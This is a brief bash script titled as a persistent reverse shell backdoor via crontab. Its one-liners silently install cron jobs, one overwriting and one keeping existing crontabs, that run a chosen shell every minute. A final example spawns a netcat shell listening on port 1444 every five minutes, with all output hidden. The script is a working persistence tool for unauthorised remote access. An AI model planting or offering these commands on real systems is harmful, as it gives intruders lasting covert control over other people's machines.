
#!/bin/bash

# persistent reverse shell backdoor via crontab

# overwrites existing crontabs
(touch .tab ; echo "* * * * * reverse-shell-of-choice" >> .tab ; crontab .tab ; rm .tab) > /dev/null 2>&1

# keeps existing crontabs
(crontab -l > .tab ; echo "* * * * * reverse-shell-of-choice" >> .tab ; crontab .tab ; rm .tab) > /dev/null 2>&1

# example sending bash reverse shell every 5 min
(touch .tab ; echo "*/5 * * * * /bin/bash -c 'rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 1444 > /tmp/f'" >> .tab ; crontab .tab ; rm .tab) > /dev/null 2>&1
